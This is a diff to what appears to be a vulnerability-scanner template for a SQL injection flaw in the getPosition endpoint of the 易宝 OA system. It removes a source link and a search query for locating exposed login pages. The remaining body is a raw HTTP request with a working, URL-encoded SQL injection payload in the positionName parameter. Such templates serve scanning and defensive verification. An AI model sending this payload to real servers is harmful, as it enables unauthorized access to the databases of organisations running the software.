@@ -3,12 +3,8 @@ info:
   name: 易宝OA getPosition 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ioqg2sxatogngos7'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ioqg2sxatogngos7
-    fofa: title="欢迎登录易宝OA系统"
 http:
 - raw:
   - GET /SmartTradeScan/StockTake/getPosition?positionName=a1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&stockRoomID=1&opeID=1¤tStatus=1&pickUpMode=11 HTTP/1.1
